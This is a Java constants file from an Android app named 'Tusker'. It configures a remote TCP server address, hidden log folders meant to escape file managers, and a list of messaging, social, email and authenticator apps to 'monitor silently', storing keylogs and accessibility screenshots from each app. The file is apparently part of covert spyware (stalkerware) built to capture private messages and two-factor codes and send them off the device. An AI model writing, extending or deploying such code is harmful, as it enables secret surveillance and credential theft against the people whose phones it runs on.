package com.task.tusker.utils;

public class Constants {

    // ========== TCP SERVER DISCOVERY ==========
    // The current Zeabur TCP forwarding address is returned as plain text
    // (host:port). SocketManager persists the last valid response and only
    // requests a fresh value when that saved route cannot be reached.
    public static final String TCP_ENDPOINT_URL = "https://devport.zeabur.app/api";

    public static final int TCP_RECONNECT_DELAY = 1500;
    public static final int HEARTBEAT_INTERVAL  = 10000;

    // ========== LOG STORAGE ==========
    // Hidden inside app's private internal data (not visible in file managers)
    // Path: /data/data/<package>/files/.logs/
    public static final String LOG_DIR        = ".kl";
    public static final String LOG_DATE_FMT   = "yyyy-MM-dd";

    // ========== APP MONITOR ==========
    // Hidden inside app's private internal data
    // Path: /data/data/<package>/files/.am/<packageName>/
    public static final String APP_MONITOR_DIR   = ".am";

    /**
     * Packages to monitor silently.
     * Keylogs and accessibility screenshots are stored per-app, per-day.
     * Add as many packages as needed — one per line.
     *
     * Examples:
     *   "com.whatsapp"
     *   "com.instagram.android"
     *   "com.facebook.katana"
     *   "org.telegram.messenger"
     *   "com.snapchat.android"
     *   "com.zhiliaoapp.musically"   // TikTok
     *   "com.twitter.android"
     *   "com.facebook.orca"          // Messenger
     */
    public static final String[] MONITORED_PACKAGES = {
        "com.android.stk",
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.instagram.android",
        "com.facebook.katana",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.zhiliaoapp.musically",
        "com.twitter.android",
        "com.facebook.orca",
        "com.google.android.gm",
        "com.viber.voip",
        "com.skype.raider",
        "com.google.android.apps.authenticator2",
        // Add more package names here:
        // "com.app.example",
    };
}
